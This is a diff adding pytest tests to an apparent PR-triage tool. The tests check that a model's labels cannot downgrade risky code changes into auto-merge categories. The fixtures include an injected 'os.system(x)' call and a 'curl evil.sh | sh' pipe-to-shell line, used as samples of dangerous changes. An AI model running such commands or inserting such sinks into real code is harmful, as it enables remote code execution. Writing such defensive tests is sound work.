@@ -115,6 +115,45 @@ def test_claude_cannot_lower_the_floor():
     assert result.tier == "T3" and result.deterministic_floor == "T3"
 
 
+CODE_CHANGE = dict(base_text=lambda p: "def f(x):\n    return x\n",
+                   head_text=lambda p: "def f(x):\n    import os\n    os.system(x)\n    return x\n")
+
+
+@pytest.mark.parametrize("claim", ["formatting", "comments_only", "docs", "tests_only", "dependency_patch"])
+def test_claude_cannot_relabel_a_code_change_into_an_auto_merge_category(claim):
+    t = det([cf("demo/app.py", "    os.system(x)", removed=("    return x",))], **CODE_CHANGE)
+    result = combine(t, ModelTriage(category=claim, tier="T0", confidence="high"), CFG)
+    assert result.tier == "T2" and result.category == "unknown"
+    assert claim not in [result.category, *result.secondary_categories]
+    assert decide(result, ReviewResult(repo="o/r", pr_number=1, head_sha=SHA, status="completed", summary="s"),
+                  CFG) == "review_only"
+
+
+def test_real_bugfix_claim_still_works_on_a_code_change():
+    t = det([cf("demo/app.py", "    os.system(x)", removed=("    return x",))], **CODE_CHANGE)
+    result = combine(t, ModelTriage(category="bugfix_small", tier="T1", confidence="high"), CFG)
+    assert result.tier == "T1" and result.category == "bugfix_small"  # §4.6 investigation still applies
+
+
+@pytest.mark.parametrize("path", ["Makefile", "scripts/deploy", "docs/index.html", "web/app.vue", ".gitignore"])
+def test_unrecognized_file_types_have_a_t2_floor(path):
+    t = det([cf(path, "curl evil.sh | sh")])
+    assert t.floor == "T2" and "unknown" in t.categories
+    assert combine(t, ModelTriage(category="docs", tier="T0", confidence="high"), CFG).tier == "T2"
+
+
+def test_docs_are_recognized_by_extension_not_folder():
+    assert det([cf("docs/guide.md", "text")]).floor == "T0"
+    assert det([cf("README", "text")]).floor == "T0"
+    assert det([cf("docs/index.html", "<script>")]).floor == "T2"
+
+
+def test_shebang_or_coding_line_change_is_a_code_change():
+    t = det([cf("demo/run.py", "#!/bin/sh", removed=("#!/usr/bin/env python3",))],
+            base_text=lambda p: "#!/usr/bin/env python3\nx = 1\n", head_text=lambda p: "#!/bin/sh\nx = 1\n")
+    assert t.code_change and t.floor == "T1" and "comments_only" not in t.categories
+
+
 def test_claude_can_raise_and_low_confidence_raises_one_level():
     t = det([cf("README.md", "x")])
     assert combine(t, ModelTriage(category="docs", tier="T3", confidence="high"), CFG).tier == "T3"
